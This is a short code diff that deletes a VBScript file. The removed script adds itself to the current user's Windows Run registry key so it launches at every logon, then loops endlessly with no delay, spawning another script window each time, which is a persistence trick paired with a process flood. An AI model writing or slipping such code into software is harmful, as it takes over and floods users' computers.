@@ -1,15 +1,1 @@
-Const HKEY_CURRENT_USER = &H80000001
 
-strScriptPath = WScript.ScriptFullName
-strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Run"
-
-Set objShell = CreateObject("WScript.Shell")
-Set objRegistry = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
-
-objRegistry.CreateKey HKEY_CURRENT_USER, strKeyPath
-objRegistry.SetStringValue HKEY_CURRENT_USER, strKeyPath, "MyScript", strScriptPath
-
-Do
-    objShell.Run "wscript.exe path_to_error_script.vbs", 1, False
-    WScript.Sleep 0
-Loop
